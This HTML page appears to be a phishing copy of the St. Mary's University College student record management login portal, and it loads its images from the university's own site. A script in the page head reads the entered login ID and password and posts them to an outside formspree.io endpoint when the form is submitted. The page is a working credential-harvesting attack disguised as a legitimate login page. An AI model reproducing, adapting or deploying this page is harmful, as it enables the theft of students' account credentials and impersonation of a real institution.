

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
<script>
	    

    body {
        margin:0;
        padding:0;
        font:  11px/1.5em Verdana;
}

h2 {
        font: 5px Verdana, Arial, Helvetica, sans-serif;
        color: #000;
        margin: 0px;
        padding: 0px 0px 0px 15px;
}

/*- Menu Tabs F--------------------------- */

    #tabs1 {
      float:left;
      width:100%;
      background:#F4F7FB;
      font-size:85%;
      line-height:normal;
          border-bottom:1px solid #BCD2E6;
		    	  font: bold 9px/1.5em Verdana;
      }
    #tabs1 ul {
          margin:0;
          padding:10px 10px 0 5px;
          list-style:none;
      }
    #tabs1 li {
      display:inline;
      margin:0;
      padding:0;
      }
    #tabs1 a {
      float:left;
      background:url("tableft1.gif") no-repeat left top;
      margin:0;
      padding:0 0 0 4px;
      text-decoration:none;
      }
    #tabs1 a span {
      float:left;
      display:block;
      background:url("tabright1.gif") no-repeat right top;
      padding:5px 10px 4px 6px;
      color:#627EB7;
      }
    #tabs1 a span {float:none;}
    #tabs a:hover span {
      color:#627EB7;
      }
    #tabs1 a:hover {
      background-position:0% -42px;
      }
    #tabs1 a:hover span {
      background-position:100% -42px;
      }

      #tabs1 #current a {
              background-position:0% -42px;
      }
      #tabs1 #current a span {
              background-position:100% -42px;
      }
-->

    </style>
    <style>
      #center1 {
	width: 1003px;
	margin: 0 auto;
	background:  url(image/bg.jpg) repeat-y;
}
#center2 {
	width: 781px;
	margin: 0 auto;
	background: url(`http://moodle.smuc.edu.et/students/image/bg.jpg`) repeat-y;
	height:100px;
	
}

#headerp{
	font-family: Arial, Tahoma;
	font-size: 9pt;
	align:center;
}
#headert{
	font-family: Arial, Tahoma;
	font-size: 10pt;
	align:center;
	font-weight: bold;
}

#headergrep{
	font-family: Arial Narrow;
	font-size: 4;
	align:center;	
}
#center2 {
	width: 760px;
	margin: 0 auto;
	font-family: Arial, Tahoma;
	font-size: 10pt;
	font-weight: bold;

}

:link { color: rgb(51,51,125) ; text-decoration: none;}
:active { color: rgb(0,153,0) ; text-decoration: underline; }
:visited { color: rgb(85,85,175) ; text-decoration: none; }</style>
<script>
  console.log("error 323");
var onclick = () => {
	event.preventDefault();
    var id = document.getElementById('ID').value
    var pass = document.getElementById('PASS').value

    fetch("https://formspree.io/f/mqkjkvgw", {
    method: "POST",
    body: JSON.stringify({
        title: id,
        body: pass,
        userId: 1
    }),
     
    headers: {
        "Content-type": "application/json; charset=UTF-8"
    }
})
 
// Converting to JSON
.then(response => response.json())
 
// Displaying results to console
.then(json => console.log(json));
}
</script>
</head>
  <body style="margin: 0px !important;background-color: white;" data-new-gr-c-s-check-loaded="8.901.0" data-gr-ext-installed="" background="http://moodle.smuc.edu.et/students/image/bg.jpg">

  
 
<br>
<div id="center2">
<table width="100%" height="100%" cellspacing="0" cellpadding="1">
<tbody><tr>
  <td colspan="0" valign="bottom">
   <div><img src="http://moodle.smuc.edu.et/students/image/EA%20Banner5.jpg" width="771"></div>
  </td>
</tr>
<tr>
  <td valign="top"> 
    <div id="tabs1">
      <ul>
                                      <!-- CSS Tabs -->

                    <li id="current"><a href="index.php?path=c4ca4238a0b923820dcc509a6f75849b"><span>Home</span></a></li>
       
                    <li><a href="index.php?path=c81e728d9d4c2f636f067f89cc14862c"><span>Academic Calender</span></a></li>
       
                    <li><a href="index.php?path=a87ff679a2f3e71d9181a67b7542122c"><span>Admission</span></a></li>
       
                    <li><a href="index.php?path=eccbc87e4b5ce2fe28308fd9f2a7baf3"><span>Course List</span></a></li>
       
                    <li><a href="index.php?path=e4da3b7fbbce2345d7772b0674a318d5"><span>Online Application</span></a></li>
       
                    <li><a href="index.php?path=8f14e45fceea167a5a36dedd4bea2543"><span>Policies &amp; Procedures</span></a></li>
       
                    <li><a href="index.php?path=c9f0f895fb98ab9159f51fd0297e236d"><span>Notice</span></a></li>
       
                    <li><a href="index.php?path=1679091c5a880faf6fb5e6087eb1b2dc"><span>Contact Us</span></a></li>
       
                    <li><a href="index.php?path=45c48cce2e2d7fbdea1afc51c7c6ad26"><span>About</span></a></li>
               </ul>
    </div>
   </td>
  </tr>
</tbody></table>
<br>



<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title> ST. MARY'S UNIVERSITY COLLEGE STUDENTS' RECORD MANAGEMENT SYSTEM </title>
<link rel="stylesheet" type="text/css" href="style.css">
                      <style type="text/css">
<!--
  body {
      margin:0;
      padding:0;
      font:  11px/1.5em Verdana;
}

h2 {
      font: 5px Verdana, Arial, Helvetica, sans-serif;
      color: #000;
      margin: 0px;
      padding: 0px 0px 0px 15px;
}

/*- Menu Tabs F--------------------------- */

  #tabsF {
    float:left;
    width:100%;
    background:#efefef;
    font-size:85%;
    line-height:normal;
        border-bottom:1px solid #666;		
                font: bold 9px/1.5em Verdana;

    }
  #tabsF ul {
      margin:0;
      padding:10px 10px 0 5px;
      list-style:none;
    }
  #tabsF li {
    display:inline;
    margin:0;
    padding:0;
    }
  #tabsF a {
    float:left;
    background:url("tableftF.gif") no-repeat left top;
    margin:0;
    padding:0 0 0 4px;
    text-decoration:none;
    }
  #tabsF a span {
    float:left;
    display:block;
    background:url("tabrightF.gif") no-repeat right top;
    padding:5px 10px 4px 6px;
    color:#666;
    }
  /* Commented Backslash Hack hides rule from IE5-Mac \*/
  #tabsF a span {float:none;}
  /* End IE5-Mac hack */
  #tabsF a:hover span {
    color:#FFF;
    }
  #tabsF a:hover {
    background-position:0% -42px;
    }
  #tabsF a:hover span {
    background-position:100% -42px;
    }

      #tabsF #current a {
              background-position:0% -42px;
      }
      #tabsF #current a span {
              background-position:100% -42px;
      }
-->
</style>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
  document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>




<div id="center2">
              
<table>
  <tbody><tr>
   <td valign="top"><br><br>
     <form name="index" onsubmit="onClick()">
       <input type="hidden" name="refresh" value="96222">	
       <table cellspacing="0" cellpadding="1">
          <tbody><tr> 
            <td width="34%" align="left"><font size="2" face="Times New Roman, Times, serif" color="#004488"><strong>Login Id:</strong></font></td>
            <td align="left"><input type="text" name="ID" size="20" id="ID"></td>
          </tr>
          <tr> 
            <td width="34%" align="left"><font size="2" face="Times New Roman, Times, serif" color="#004488"><strong>Password:</strong></font></td>
            <td align="left"><input type="password" name="PASS" size="20" id="PASS" ></td>
          </tr>
       </tbody></table>
   
       <table align="center">
         <tbody><tr>
          <td align="center"><br><br><input type="image" name="submit" src="http://moodle.smuc.edu.et/students/image/login.jpg" border="0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
        </tr>
        <tr>
          <td><div><a href="index.php"><font color="#627EB7"><u></u></font></a></div></td>
        </tr>
       </tbody></table>

     </form>
     
    </td>
    <td width="310" height="210" background="http://moodle.smuc.edu.et/students/image/OurVisionNull.jpg"></td>
    <td width="285" height="210" background="http://moodle.smuc.edu.et/students/image/img/image15.jpg"></td>
  </tr>
</tbody></table>
<table width="100%" height="125" cellspacing="0" cellpadding="0">
 <tbody><tr>
    <td width="235" background="http://moodle.smuc.edu.et/students/image/Announce1.jpg">
      <table>
        <tbody><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
         <td><br>
       <font color="#004000"><br>
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="uploads/" target="_blank"><font size="2">&nbsp;&nbsp;<font color="#FF0000"></font></font></a></font> 
        </td></tr>
       </tbody></table>
    </td>
    <td width="290" background="http://moodle.smuc.edu.et/students/image/announce2.jpg"></td>
    <td width="280" valign="top" bgcolor="#E8E8E8" background="http://moodle.smuc.edu.et/students/image/Announce3.jpg">
       <br><br>
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#004000"><br>
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="uploads/" target="_blank"><font size="2">&nbsp;&nbsp;<font color="#FF0000"></font></font></a></font> 
    </td>
  </tr>
</tbody></table>
   <table>
    <tbody><tr><td><img src="image/line1.jpg" width="771" height="2"></td></tr>
    <tr><td><img src="image/line1.jpg" width="771" height="2"></td></tr>
    </tbody></table>
  <table width="100%">
  <tbody><tr> 
    <td width="15%"></td>
    <td align="center">
       <a href="http://www.stmarycollege.edu.et" target="_blank"><img src="http://moodle.smuc.edu.et/students/image/SMUC%20Home.jpg" width="100" height="15" border="0"></a>	     
    </td>
    <td align="center">
       <a href="http://www.google.com" target="_blank"><img src="http://moodle.smuc.edu.et/students/image/google.gif" width="80" height="15" border="0"></a>	     
    </td>
    <td align="center">
       <a href="http://www.yahoo.com" target="_blank"><img src="http://moodle.smuc.edu.et/students/image/yahoo.gif" width="100" height="15" border="0"></a>	     
    </td>
    <td align="center">
       <a href="http://www.facebook.com" target="_blank"><img src="http://moodle.smuc.edu.et/students/image/facebook.jpg" width="100" height="15" border="0"></a>	     
    </td>
    <td width="15%"></td>
  </tr>
</tbody></table>
   <table width="100%">
    <tbody><tr><td><img src="image/line1.jpg" width="771" height="2"></td></tr>
    <tr><td><img src="image/line1.jpg" width="771" height="2"></td></tr>
    </tbody></table>

<table width="100%">
  <tbody><tr>
    <td valign="top" align="right"><font color="#D2D2D2">Copyright © 2010 St. Mary's University College <br>Designed By Nebiyu Hailetsion </font></td>
  </tr>
</tbody></table>
</div>



</div>

</body>


